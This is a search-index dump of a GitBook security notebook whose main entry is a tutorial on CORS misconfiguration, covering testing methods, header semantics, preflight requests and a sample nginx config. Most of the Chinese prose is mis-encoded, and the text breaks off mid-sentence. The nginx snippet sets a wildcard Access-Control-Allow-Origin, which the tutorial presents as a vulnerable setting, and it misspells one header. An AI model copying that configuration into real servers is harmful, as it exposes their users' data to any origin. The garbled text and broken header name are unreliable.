{"./":{"url":"./","title":"Security Book","keywords":"","body":"Readme Web Book Redteam Book Email Book Network Book Other Book Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-14 19:52:52 "},"web/readme.html":{"url":"web/readme.html","title":"Web","keywords":"","body":"å…³äº Web çš„çŸ¥è¯†åˆé›†~ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-14 19:29:59 "},"web/CORS è·¨åŸŸæ¼æ´.html":{"url":"web/CORS è·¨åŸŸæ¼æ´.html","title":"CORS è·¨åŸŸæ¼æ´","keywords":"","body":"0x01 æ¼æ´æè¿° æ¦‚è¿° CORSï¼Œè·¨åŸŸèµ„æºå…±äº«ï¼ˆCross-Origin Resource Sharingï¼‰ï¼Œæ˜¯ H5 æä¾›çš„ä¸€ç§æœºåˆ¶ï¼ŒWEB åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡åœ¨ HTTP å¢åŠ å­—æ®µæ¥å‘Šè¯‰æµè§ˆå™¨ï¼Œå“ªäº›ä¸åŒæ¥æºçš„æœåŠ¡å™¨æ˜¯æœ‰æƒè®¿é—®æœ¬ç«™èµ„æºçš„ï¼Œå½“ä¸åŒåŸŸçš„è¯·æ±‚å‘ç”Ÿæ—¶ï¼Œå°±å‡ºç°äº†è·¨åŸŸçš„ç°è±¡ã€‚å½“è¯¥é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå°±å¯¼è‡´èµ„æºè¢«æ¶æ„æ“ä½œã€‚ å½“ CORS çš„è®¾ç½®ä¸æ­£ç¡®æ—¶ï¼Œå°±ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ï¼›å½“å“åº”å¤´ä¸­çš„ Access-Control-Allow-Originâ€‹â€‹ è®¾ç½®ä¸º nullâ€‹â€‹ æˆ– *â€‹â€‹ æ—¶ï¼Œè¡¨ç¤ºä¿¡ä»»ä»»ä½•åŸŸï¼Œè¿™æ—¶å€™å°±å¯èƒ½å¼•å…¥å®‰å…¨é—®é¢˜ã€‚ ã€Œä½ çš„ Request é‚„æ˜¯æœ‰ç™¼å‡ºå»çš„ã€ï¼Œè€Œä¸”ç€è¦½å™¨ä¹Ÿã€Œç¢ºå¯¦æœ‰æ”¶åˆ° Responseã€ï¼Œé‡é»æ˜¯ã€Œç€è¦½å™¨å› ç‚ºåŒæºæ”¿ç­–ï¼Œä¸æŠŠçµæœå‚³å›çµ¦ä½ çš„ JavaScriptã€ã€‚å¦‚æœæ²’æœ‰ç€è¦½å™¨çš„è©±å…¶å¯¦å°±æ²’æœ‰é€™äº›å•é¡Œï¼Œä½ æ„›ç™¼çµ¦èª°å°±ç™¼çµ¦èª°ï¼Œä¸ç®¡æ€æ¨£éƒ½æ‹¿å¾—åˆ° Responseã€‚ ç•¶ç€è¦½å™¨æ”¶åˆ° Response ä¹‹å¾Œï¼Œæœƒå…ˆæª¢æŸ¥ Access-Control-Allow-Originâ€‹â€‹â€‹ è£¡é¢çš„å…§å®¹ï¼Œå¦‚æœè£¡é¢æœ‰åŒ…å«ç¾åœ¨é€™å€‹ç™¼èµ· Request çš„ Origin çš„è©±ï¼Œå°±æœƒå…è¨±é€šéï¼Œè®“ç¨‹å¼é †åˆ©æ¥æ”¶åˆ° Responseã€‚ æ‰€ä»¥ï¼ŒåŒæºç­–ç•¥å¹¶ä¸é™åˆ¶è¯·æ±‚çš„å‘èµ·å’Œå“åº”ï¼Œåªæ˜¯æµè§ˆå™¨æ‹’ç»äº† jsâ€‹â€‹â€‹ å¯¹å“åº”èµ„æºçš„æ“ä½œã€‚ã€è¯¥æ¼æ´çš„æµ‹è¯•è¯¯åŒºï¼Œè¦æ³¨æ„åŒæºé™åˆ¶ç­–ç•¥æ˜¯é’ˆå¯¹æµè§ˆå™¨çš„ã€‘ æµ‹è¯•æ–¹æ³• æµ‹è¯•äººå‘˜è®¿é—®æŸä¸ª urlï¼Œå°†è¯·æ±‚å¤´ä¸­çš„ Origin å­—æ®µä¿®æ”¹ä¸ºä»»æ„å€¼ï¼Œç»“æœä»ç„¶èƒ½è·å¾—æ­£ç¡®çš„å“åº”æŠ¥æ–‡ï¼ˆè¿™ä¼šå¯¼è‡´è¯¯æŠ¥ä¸åº”è¯¥ä½¿ç”¨è¯¥æµ‹è¯•æ–¹æ³•ï¼‰ï¼Œå°±è¯´æ˜æœ‰ CORS æ¼æ´ å¯ä»¥é€šè¿‡æµè§ˆå™¨çš„æ§åˆ¶å°çš„ networkï¼ŒæŸ¥çœ‹æ¥å£çš„è¯·æ±‚åŒ… response å¤´ä¸­ Access-Control-Allow-Origin æ˜¯å¦è®¾ç½®ä¸º *â€‹â€‹ ä¹Ÿå¯ä»¥é€šè¿‡æŠ“åŒ…å·¥å…·ï¼ŒæŸ¥çœ‹æ¥å£è¿”å›çš„ response ä¸­æ˜¯ Access-Control-Allow-Origin æ˜¯å¦è®¾ç½®ä¸º * or null ç­‰å…¶ä»–é…ç½®ç»„åˆï¼Œè¯¦è§ä¸‹æ–‡ã€‚â€‹â€‹ æ¼æ´ç¤ºä¾‹ é…ç½® Access-Control-Allow-Origin ä¸º *â€‹â€‹ é…ç½® Access-Control-Allow-Origin ä½†æ˜¯è¯¥å€¼å¯æ§ 0x02 CORS è¯¦è§£ CORS æ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œå…¨ç§°æ˜¯\"è·¨åŸŸèµ„æºå…±äº«\"ï¼ˆCross-origin resource sharingï¼‰ã€‚CORS çš„åŸºæœ¬åŸç†æ˜¯ï¼Œç¬¬ä¸‰æ–¹ç½‘ç«™æœåŠ¡å™¨ç”Ÿæˆè®¿é—®æ§åˆ¶ç­–ç•¥ï¼ŒæŒ‡å¯¼ç”¨æˆ·æµè§ˆå™¨æ”¾å®½ SOP çš„é™åˆ¶ï¼Œå®ç°ä¸æŒ‡å®šçš„ç›®æ ‡ç½‘ç«™å…±äº«æ•°æ®ã€‚ å®ƒå…è®¸æµè§ˆå™¨å‘è·¨æºæœåŠ¡å™¨ï¼Œå‘å‡º XMLHttpRequestâ€‹â€‹â€‹ â€‹è¯·æ±‚ï¼Œä»è€Œå…‹æœäº† AJAX åªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ CORS éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ŒIE æµè§ˆå™¨ä¸èƒ½ä½äº IE10ã€‚ æ•´ä¸ª CORS é€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚å¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒCORS é€šä¿¡ä¸åŒæºçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç° AJAXâ€‹â€‹ è¯·æ±‚è·¨æºï¼Œå°±ä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„Ÿè§‰ã€‚ å› æ­¤ï¼Œå®ç° CORS é€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº† CORS æ¥å£ï¼Œå°±å¯ä»¥è·¨æºé€šä¿¡ã€‚ JSONP åªæ”¯æŒ GETâ€‹â€‹ è¯·æ±‚ï¼ŒCORS æ”¯æŒæ‰€æœ‰ç±»å‹çš„ HTTP è¯·æ±‚ã€‚ JSONP çš„ä¼˜åŠ¿åœ¨äºæ”¯æŒè€å¼æµè§ˆå™¨ï¼Œä»¥åŠå¯ä»¥å‘ä¸æ”¯æŒ CORS çš„ç½‘ç«™è¯·æ±‚æ•°æ®ã€‚ CORS å·¥ä½œæµç¨‹ï¼ˆé’ˆå¯¹æµè§ˆå™¨çš„ï¼‰ è¯·æ±‚æ–¹è„šæœ¬ä»ç”¨æˆ·æµè§ˆå™¨å‘é€è·¨åŸŸè¯·æ±‚ã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ¨æ¯ä¸ªè·¨åŸŸè¯·æ±‚ä¸­æ·»åŠ  Origin å¤´ï¼Œç”¨äºå£°æ˜è¯·æ±‚æ–¹çš„æºã€‚ èµ„æºæœåŠ¡å™¨æ ¹æ®è¯·æ±‚ä¸­ Origin å¤´è¿”å›è®¿é—®æ§åˆ¶ç­–ç•¥(Access-Control-Allow-Origin å“åº”å¤´)ï¼Œå¹¶åœ¨å…¶ä¸­å£°æ˜å…è®¸è¯»å–å“åº”å†…å®¹çš„æºã€‚ æµè§ˆå™¨æ£€æŸ¥èµ„æºæœåŠ¡å™¨åœ¨ Access-Control-Allow-Origin å¤´ä¸­å£°æ˜çš„æºï¼Œæ˜¯å¦ä¸è¯·æ±‚æ–¹çš„æºç›¸ç¬¦ï¼Œå¦‚æœç›¸ç¬¦åˆï¼Œåˆ™å…è®¸è¯·æ±‚æ–¹è„šæœ¬è¯»å–å“åº”å†…å®¹ï¼Œå¦åˆ™ä¸å…è®¸ã€‚ ä»€ä¹ˆæ˜¯åŒæº & è·¨åŸŸ åŒæºï¼šåè®®ç›¸åŒ & ç«¯å£ç›¸åŒ & ä¸»æœºï¼ˆåŸŸåï¼‰ç›¸åŒ è·¨åŸŸï¼šä¸Šè¿°ä¹‹ä¸€ä¸åŒï¼Œå¦‚ ç½‘ç»œåè®®ä¸åŒï¼Œå¦‚ http åè®®è®¿é—® https åè®® ; ç«¯å£ä¸åŒï¼Œå¦‚ 80 ç«¯å£è®¿é—® 8080 ç«¯å£ ; åŸŸåä¸åŒï¼Œå¦‚ www.test1.com è®¿é—® www.test2.com ; å­åŸŸåä¸åŒï¼Œå¦‚ abc.test1.com è®¿é—® def.test1.com ; æµè§ˆå™¨å°† CORS è¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰å’Œéç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰ã€‚ ä¸€äº›åº”ç”¨åœºæ™¯ æ¯”å¦‚åç«¯å¼€å‘å®Œä¸€éƒ¨åˆ†ä¸šåŠ¡ä»£ç åï¼Œæä¾›æ¥å£ç»™å‰ç«¯ç”¨ï¼Œåœ¨å‰åç«¯åˆ†ç¦»çš„æ¨¡å¼ä¸‹ï¼Œå‰åç«¯çš„åŸŸåæ˜¯ä¸ä¸€è‡´çš„ï¼Œæ­¤æ—¶å°±ä¼šå‘ç”Ÿè·¨åŸŸè®¿é—®çš„é—®é¢˜ã€‚ ç¨‹åºå‘˜åœ¨æœ¬åœ°åšå¼€å‘ï¼Œæœ¬åœ°çš„æ–‡ä»¶å¤¹å¹¶ä¸æ˜¯åœ¨ä¸€ä¸ªåŸŸä¸‹é¢ï¼Œå½“ä¸€ä¸ªæ–‡ä»¶éœ€è¦å‘é€ ajax è¯·æ±‚ï¼Œè¯·æ±‚å¦å¤–ä¸€ä¸ªé¡µé¢çš„å†…å®¹çš„æ—¶å€™ï¼Œå°±ä¼šè·¨åŸŸã€‚ ç”µå•†ç½‘ç«™æƒ³é€šè¿‡ç”¨æˆ·æµè§ˆå™¨åŠ è½½ç¬¬ä¸‰æ–¹å¿«é€’ç½‘ç«™çš„ç‰©æµä¿¡æ¯ã€‚ å­ç«™åŸŸåå¸Œæœ›è°ƒç”¨ä¸»ç«™åŸŸåçš„ç”¨æˆ·èµ„æ–™æ¥å£ï¼Œå¹¶å°†æ•°æ®æ˜¾ç¤ºå‡ºæ¥ã€‚ ç®€å•è¯·æ±‚ åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äºç®€å•è¯·æ±‚ã€‚ ï¼ˆ1ï¼‰è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼š HEAD GET POST ï¼ˆ2ï¼‰HTTP çš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼š Accept Accept-Language Content-Language Last-Event-ID Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼ application/x-www-form-urlencodedâ€‹â€‹ã€multipart/form-dataâ€‹â€‹ã€text/plainâ€‹â€‹ è¿™æ˜¯ä¸ºäº†å…¼å®¹è¡¨å•ï¼ˆformï¼‰ï¼Œå› ä¸ºå†å²ä¸Šè¡¨å•ä¸€ç›´å¯ä»¥å‘å‡ºè·¨åŸŸè¯·æ±‚ã€‚AJAXâ€‹â€‹ çš„è·¨åŸŸè®¾è®¡å°±æ˜¯ï¼Œåªè¦è¡¨å•å¯ä»¥å‘ï¼ŒAJAX å°±å¯ä»¥ç›´æ¥å‘ã€‚ å‡¡æ˜¯ä¸åŒæ—¶æ»¡è¶³ä¸Šé¢ä¸¤ä¸ªæ¡ä»¶ï¼Œå°±å±äºéç®€å•è¯·æ±‚ã€‚ æµè§ˆå™¨å¯¹è¿™ä¸¤ç§è¯·æ±‚çš„å¤„ç†ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ åŸºæœ¬æµç¨‹ å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ç›´æ¥å‘å‡º CORS è¯·æ±‚ã€‚ å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œå¢åŠ ä¸€ä¸ª Originâ€‹â€‹ â€‹å­—æ®µã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘ç°è¿™æ¬¡è·¨æº AJAXâ€‹â€‹ è¯·æ±‚æ˜¯ç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨åœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæ·»åŠ ä¸€ä¸ª Originâ€‹â€‹ â€‹å­—æ®µã€‚ GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... ä¸Šé¢çš„å¤´ä¿¡æ¯ä¸­ï¼ŒOriginâ€‹ â€‹å­—æ®µç”¨æ¥è¯´æ˜ï¼Œæœ¬æ¬¡è¯·æ±‚æ¥è‡ªå“ªä¸ªæºï¼ˆåè®® + åŸŸå + ç«¯å£ï¼‰ã€‚æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå€¼ï¼Œå†³å®šæ˜¯å¦åŒæ„è¿™æ¬¡è¯·æ±‚ã€‚ å¦‚æœ Originâ€‹â€‹ â€‹æŒ‡å®šçš„æºï¼Œä¸åœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ã€‚æµè§ˆå™¨å‘ç°ï¼Œè¿™ä¸ªå›åº”çš„å¤´ä¿¡æ¯æ²¡æœ‰åŒ…å« Access-Control-Allow-Originâ€‹â€‹ â€‹å­—æ®µï¼ˆè¯¦è§ä¸‹æ–‡ï¼‰ï¼Œå°±çŸ¥é“å‡ºé”™äº†ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè¢« XMLHttpRequestâ€‹â€‹ â€‹çš„ onerrorâ€‹â€‹ â€‹å›è°ƒå‡½æ•°æ•è·ã€‚æ³¨æ„ï¼Œè¿™ç§é”™è¯¯æ— æ³•é€šè¿‡çŠ¶æ€ç è¯†åˆ«ï¼Œå› ä¸º HTTP å›åº”çš„çŠ¶æ€ç æœ‰å¯èƒ½æ˜¯ 200ã€‚ å¦‚æœ Originâ€‹ â€‹æŒ‡å®šçš„åŸŸååœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨è¿”å›çš„å“åº”ï¼Œä¼šå¤šå‡ºå‡ ä¸ªå¤´ä¿¡æ¯å­—æ®µã€‚ Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access_control-Allow-Method: * Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 ä¸Šé¢çš„å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œæœ‰ä¸‰ä¸ªä¸ CORS è¯·æ±‚ç›¸å…³çš„å­—æ®µï¼Œéƒ½ä»¥ Access-Control-â€‹ â€‹å¼€å¤´ã€‚ ï¼ˆ1ï¼‰Access-Control-Allow-Origin è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ã€‚å®ƒçš„å€¼è¦ä¹ˆæ˜¯è¯·æ±‚æ—¶ Originâ€‹â€‹ å­—æ®µçš„å€¼ï¼Œè¦ä¹ˆæ˜¯ä¸€ä¸ª *â€‹â€‹ ï¼Œè¡¨ç¤ºæ¥å—ä»»æ„åŸŸåçš„è¯·æ±‚ã€‚ ï¼ˆ2ï¼‰Access-Control-Allow-Credentials è¯¥å­—æ®µå¯é€‰ã€‚å®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…è®¸å‘é€ Cookieâ€‹â€‹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒCookie ä¸åŒ…æ‹¬åœ¨ CORS è¯·æ±‚ä¹‹ä¸­ã€‚è®¾ä¸º trueâ€‹â€‹â€‹ï¼Œå³è¡¨ç¤ºæœåŠ¡å™¨æ˜ç¡®è®¸å¯ï¼ŒCookie å¯ä»¥åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œä¸€èµ·å‘ç»™æœåŠ¡å™¨ã€‚è¿™ä¸ªå€¼ä¹Ÿåªèƒ½è®¾ä¸º trueâ€‹â€‹â€‹ï¼Œå¦‚æœæœåŠ¡å™¨ä¸è¦æµè§ˆå™¨å‘é€ Cookieï¼Œåˆ é™¤è¯¥å­—æ®µå³å¯ã€‚ ï¼ˆ3ï¼‰Access-Control-Expose-Headers è¯¥å­—æ®µå¯é€‰ã€‚CORS è¯·æ±‚æ—¶ï¼ŒXMLHttpRequestâ€‹â€‹ â€‹å¯¹è±¡çš„ getResponseHeader()â€‹â€‹ â€‹æ–¹æ³•åªèƒ½æ‹¿åˆ° 6 ä¸ªåŸºæœ¬å­—æ®µï¼šCache-Controlâ€‹â€‹â€‹ã€Content-Languageâ€‹â€‹â€‹ã€Content-Typeâ€‹â€‹â€‹ã€Expiresâ€‹â€‹â€‹ã€Last-Modifiedâ€‹â€‹â€‹ã€Pragmaâ€‹â€‹â€‹ã€‚å¦‚æœæƒ³æ‹¿åˆ°å…¶ä»–å­—æ®µï¼Œå°±å¿…é¡»åœ¨ Access-Control-Expose-Headersâ€‹â€‹ â€‹é‡Œé¢æŒ‡å®šã€‚ä¸Šé¢çš„ä¾‹å­æŒ‡å®šï¼ŒgetResponseHeader('FooBar')â€‹â€‹ â€‹å¯ä»¥è¿”å› FooBarâ€‹â€‹ â€‹å­—æ®µçš„å€¼ã€‚ ï¼ˆ4ï¼‰Access-Control-Allow-Methodsâ€‹ è¯¥å­—æ®µè¡¨ç¤ºå…è®¸è¯·æ±‚çš„æ–¹æ³•ï¼Œæ¯”å¦‚ GET, POST, PUT, DELETE ç­‰ â€‹add_header 'Access-Control-Allow-Methods' *;â€‹â€‹ // è¡¨ç¤ºå…è®¸ä»»æ„æ–¹æ³• æœåŠ¡ç«¯çš„ Nginx é…ç½® è¯·ç¡®ä¿å°†é…ç½®è¡Œæ·»åŠ åˆ° httpâ€‹â€‹ é…ç½®å—çš„å¤§æ‹¬å· ({}â€‹â€‹) å†…å¹¶ä¿å­˜é‡å¯ Nginxã€‚ http { include mime.types; default_type application/octet-stream; # å…¶ä»–é…ç½®... # æ·»åŠ ä¸‹é¢è¿™è¡Œé…ç½®ï¼Œå…è®¸è·¨åŸŸè¯·æ±‚çš„ç½‘ç«™ #add_header 'Access-Control-Allow-Origin' 'http://xxx.xxx.xxx'; add_header 'Access-Control-Allow-Origin' '*'; #add_header 'Access-Control-Allow-Credential' 'true'; add_header 'Access_control-Allow-Method' '*'; # å…¶ä»–é…ç½®... } withCredentials å±æ€§ ä¸Šé¢è¯´åˆ°ï¼ŒCORS è¯·æ±‚é»˜è®¤ä¸å‘é€ Cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ã€‚å¦‚æœè¦æŠŠ Cookie å‘åˆ°æœåŠ¡å™¨ï¼Œä¸€æ–¹é¢è¦æœåŠ¡å™¨åŒæ„ï¼ŒæŒ‡å®š Access-Control-Allow-Credentialsâ€‹ â€‹å­—æ®µã€‚ Access-Control-Allow-Credentials: true å¦ä¸€æ–¹é¢ï¼Œå¼€å‘è€…å¿…é¡»åœ¨ AJAXâ€‹â€‹ è¯·æ±‚ä¸­æ‰“å¼€ withCredentialsâ€‹â€‹ â€‹å±æ€§ã€‚ var xhr = new XMLHttpRequest(); xhr.withCredentials = true; å¦åˆ™ï¼Œå³ä½¿æœåŠ¡å™¨åŒæ„å‘é€ Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå‘é€ã€‚æˆ–è€…ï¼ŒæœåŠ¡å™¨è¦æ±‚è®¾ç½® Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå¤„ç†ã€‚ ä½†æ˜¯ï¼Œå¦‚æœçœç•¥ withCredentialsâ€‹ â€‹è®¾ç½®ï¼Œæœ‰çš„æµè§ˆå™¨è¿˜æ˜¯ä¼šä¸€èµ·å‘é€ Cookieã€‚è¿™æ—¶ï¼Œå¯ä»¥æ˜¾å¼å…³é—­ withCredentialsâ€‹â€‹ã€‚ xhr.withCredentials = false; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦å‘é€ Cookieï¼ŒAccess-Control-Allow-Originâ€‹â€‹ â€‹å°±ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æŒ‡å®šæ˜ç¡®çš„ã€ä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåã€‚åŒæ—¶ï¼ŒCookie ä¾ç„¶éµå¾ªåŒæºæ”¿ç­–ï¼Œåªæœ‰ç”¨æœåŠ¡å™¨åŸŸåè®¾ç½®çš„ Cookie æ‰ä¼šä¸Šä¼ ï¼Œå…¶ä»–åŸŸåçš„ Cookie å¹¶ä¸ä¼šä¸Šä¼ ï¼Œä¸”ï¼ˆè·¨æºï¼‰åŸç½‘é¡µä»£ç ä¸­çš„ document.cookieâ€‹â€‹ â€‹ä¹Ÿæ— æ³•è¯»å–æœåŠ¡å™¨åŸŸåä¸‹çš„ Cookieã€‚ éç®€å•è¯·æ±‚ éç®€å•è¯·æ±‚æ˜¯é‚£ç§å¯¹æœåŠ¡å™¨æœ‰ç‰¹æ®Šè¦æ±‚çš„è¯·æ±‚ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹æ³•æ˜¯ PUTâ€‹â€‹ æˆ– DELETEâ€‹â€‹ï¼Œæˆ–è€… Content-Typeâ€‹â€‹ å­—æ®µçš„ç±»å‹æ˜¯ application/jsonâ€‹â€‹ã€‚ éç®€å•è¯·æ±‚çš„ CORS è¯·æ±‚ï¼Œä¼šåœ¨æ­£å¼é€šä¿¡ä¹‹å‰ï¼Œå¢åŠ ä¸€æ¬¡ HTTP æŸ¥è¯¢è¯·æ±‚ï¼Œç§°ä¸º\"é¢„æ£€\"è¯·æ±‚ï¼ˆpreflightâ€‹â€‹ï¼‰ã€‚ é¢„æ£€è¯·æ±‚ æµè§ˆå™¨å…ˆè¯¢é—®æœåŠ¡å™¨ï¼Œå½“å‰ç½‘é¡µæ‰€åœ¨çš„åŸŸåæ˜¯å¦åœ¨æœåŠ¡å™¨çš„è®¸å¯åå•ä¹‹ä¸­ï¼Œä»¥åŠå¯ä»¥ä½¿ç”¨å“ªäº› HTTP åŠ¨è¯å’Œå¤´ä¿¡æ¯å­—æ®µã€‚åªæœ‰å¾—åˆ°è‚¯å®šç­”å¤ï¼Œæµè§ˆå™¨æ‰ä¼šå‘å‡ºæ­£å¼çš„ XMLHttpRequestâ€‹ â€‹è¯·æ±‚ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚ ä¸‹é¢æ˜¯ä¸€æ®µæµè§ˆå™¨çš„ JavaScript è„šæœ¬ï¼Œåœ¨æµè§ˆå™¨ consoloâ€‹â€‹ æ‰§è¡Œã€‚ var url = 'http://api.alice.com/cors'; var xhr = new XMLHttpRequest(); xhr.open('PUT', url, true); xhr.setRequestHeader('X-Custom-Header', 'value'); xhr.send(); ä¸Šé¢ä»£ç ä¸­ï¼ŒHTTP è¯·æ±‚çš„æ–¹æ³•æ˜¯ PUTâ€‹â€‹ï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªè‡ªå®šä¹‰å¤´ä¿¡æ¯ X-Custom-Headerâ€‹â€‹ã€‚ æµè§ˆå™¨å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªéç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨å‘å‡ºä¸€ä¸ª\"é¢„æ£€\"è¯·æ±‚ï¼Œè¦æ±‚æœåŠ¡å™¨ç¡®è®¤å¯ä»¥è¿™æ ·è¯·æ±‚ã€‚ä¸‹é¢æ˜¯è¿™ä¸ª\"é¢„æ£€\"è¯·æ±‚çš„ HTTP å¤´ä¿¡æ¯ã€‚ OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... \"é¢„æ£€\"è¯·æ±‚ç”¨çš„è¯·æ±‚æ–¹æ³•æ˜¯ OPTIONSâ€‹â€‹â€‹ï¼Œè¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯ç”¨æ¥è¯¢é—®çš„ã€‚å¤´ä¿¡æ¯é‡Œé¢ï¼Œå…³é”®å­—æ®µæ˜¯ Originâ€‹â€‹â€‹ï¼Œè¡¨ç¤ºè¯·æ±‚æ¥è‡ªå“ªä¸ªæºã€‚ é™¤äº† Originâ€‹ â€‹å­—æ®µï¼Œ\"é¢„æ£€\"è¯·æ±‚çš„å¤´ä¿¡æ¯åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šå­—æ®µã€‚ ï¼ˆ1ï¼‰Access-Control-Request-Method è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥åˆ—å‡ºæµè§ˆå™¨çš„ CORS è¯·æ±‚ä¼šç”¨åˆ°å“ªäº› HTTP æ–¹æ³•ï¼Œä¸Šä¾‹æ˜¯ PUTâ€‹â€‹ã€‚ ï¼ˆ2ï¼‰Access-Control-Request-Headers è¯¥å­—æ®µæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šæµè§ˆå™¨ CORS è¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µï¼Œä¸Šä¾‹æ˜¯ X-Custom-Headerâ€‹â€‹â€‹â€‹ã€‚ ä¸ºä»€ä¹ˆéœ€è¦é¢„è¯·æ±‚ï¼Ÿ å‡è¨­ä»Šå¤©æŸå€‹ Server æä¾›äº†ä¸€å€‹ API ç¶²å€å«åšï¼šhttps://example.com/data/16â€‹â€‹ï¼Œä½ åªè¦å°å®ƒç™¼é€ GETï¼Œå°±èƒ½å¤ æ‹¿åˆ° id æ˜¯ 16 çš„è³‡æ–™ï¼Œåªè¦å°å®ƒç™¼é€ DELETEï¼Œå°±å¯ä»¥æŠŠé€™ç­†è³‡æ–™åˆªé™¤ã€‚ å¦‚æœä»Šå¤©æ²’æœ‰ Preflight Request é€™å€‹æ©Ÿåˆ¶çš„è©±ï¼Œæˆ‘å°±å¯ä»¥åœ¨éš¨ä¾¿ä¸€å€‹ Domain çš„ç¶²é ä¸Šé¢ç™¼é€ä¸€å€‹ DELETE çš„ Request çµ¦é€™å€‹ APIã€‚å‰›å‰›æˆ‘æœ‰å¼·èª¿èªªç€è¦½å™¨çš„ CORS æ©Ÿåˆ¶ï¼Œé‚„æ˜¯æœƒå¹«ä½ ç™¼é€ Requestï¼Œä½†åªæ˜¯ Response è¢«ç€è¦½å™¨æ“‹ä½è€Œå·²ã€‚ å› æ­¤å‘¢ï¼Œå„˜ç®¡æ²’æœ‰ Responseï¼Œä½†æ˜¯ Server ç«¯çš„ç¢ºæ”¶åˆ°äº†é€™å€‹ Requestï¼Œå› æ­¤å°±æœƒæŠŠé€™ç­†è³‡æ–™çµ¦åˆªé™¤ã€‚ å¦‚æœæœ‰ Preflight Request çš„è©±ï¼Œåœ¨ç™¼é€å‡ºå»æ”¶åˆ°çµæœçš„æ™‚å€™ï¼Œå°±æœƒçŸ¥é“é€™å€‹ API ä¸¦æ²’æœ‰æä¾› CORSï¼Œå› æ­¤çœŸçš„ DELETE è«‹æ±‚å°±ä¸æœƒé€å‡ºï¼Œåˆ°é€™é‚Šå°±çµæŸäº†ã€‚ å…ˆç”¨ä¸€å€‹ OPTIONS çš„è«‹æ±‚å»ç¢ºèªä¹‹å¾Œçš„ Request 